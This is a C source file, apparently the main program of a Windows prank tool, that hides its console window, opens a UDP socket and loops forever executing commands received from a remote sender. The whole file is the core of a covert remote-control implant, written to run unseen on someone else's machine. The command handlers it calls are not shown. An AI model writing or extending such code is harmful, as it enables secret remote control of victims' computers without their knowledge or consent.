//#pragma balls
/*
*   Made by the Akadamia Pranków Cheetos
*/

#include "Main.h"
#include "src/Funnies.h"
#include "src/Socket.h"

struct TeltharSocket tsocket;

extern const char *PCName; // PC authentication

int main(int argc, char *argv[])
{
    // Hide console
    HWND window = GetConsoleWindow();
    ShowWindow(window, SW_MINIMIZE);
    ShowWindow(window, SW_HIDE);

    if (argv[1] == NULL) {
        logErr("Callname not defined.");
        return 1;
    }

    PCName = argv[1];

    // Initialize UDP socket
    if (UDPBegin(&tsocket) != 0) {
        logErr("Couldn't initialize socket server.");
        return -1;
    }

    JBCMD recv;

    /* ---- Main recieving loop ---- */
    while (1) {
        if (UDPRecv(&tsocket, &recv, sizeof(JBCMD)) < 0) {
            logErr("Socket error.\n");
            return -1;
        }
        execCommand(recv);
    }
    
    return 0;
}